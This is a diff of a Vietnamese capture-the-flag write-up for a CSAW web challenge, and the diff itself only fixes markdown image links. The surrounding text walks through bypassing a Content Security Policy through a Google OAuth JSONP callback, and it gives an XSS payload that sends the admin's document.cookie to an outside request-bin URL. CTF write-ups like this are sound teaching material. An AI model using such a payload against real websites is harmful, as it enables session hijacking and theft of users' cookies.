@@ -10,7 +10,7 @@
 
 > Sơ bộ 1 chút thì Content Security Policy (CSP) là chính sách bảo mật nội dung, được sử dụng để xác định các nguồn nội dung an toàn trên website mà trình duyệt có thể tải về cho người dùng. CSP là biện pháp đối phó rất hiệu quả với kiểu hack chèn mã độc Cross Site Scripting (XSS).
 
-[csp](image/csp.png)
+![csp](image/csp.png)
 
 - Chú ý đến đoạn: `script-src 'self' *.google.com`
     - Hiểu đơn giản 1 chút thì đoạn csp trên chỉ định rõ nguồn sử dụng Javascript hợp lệ là `*google.com`
@@ -28,7 +28,7 @@
     `<script type="text/javascript" src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>`
     - Vì viết writeup hơi muộn nên web đóng mất tiêu rồi. Ảnh nào có thì up luôn, ảnh nào không có thì đi mượn ké vậy...
 
-    [alert](alert.png)
+    ![alert](alert.png)
    - Thành công mỹ mãn, giờ thì dễ rồi. Tạo 1 requestsbin ngay và luôn để hứng flag thôi chứ làm gì
    - đoạn payload để get cookie admin của mình: `location.replace('https://enzbo4rvhzz9n.x.pipedream.net/?key='%2bdocument.cookie)`
 
@@ -42,4 +42,4 @@
 - Bây giờ ra submit đại 1 cái gì đó lên, rồi nhấn vô `report to admin`, và bây giờ ta được chuyển qua link `http://web.chal.csaw.io:1000/report?id=52279` trong 1 khoảng khắc. Giờ rõ rồi, mỗi submit sẽ tạo 1 post chứa id riêng và khi report lên admin thì chỉ cần thay id là được.
 - Giờ đơn giản rồi, submit lại payload và lấy ra id của nó. Thay vô link report rồi report lên admin lại là xong. Bây giờ lên requestsbin lấy flag thôi
 
-[flag](image/flag.png)
+![flag](image/flag.png)
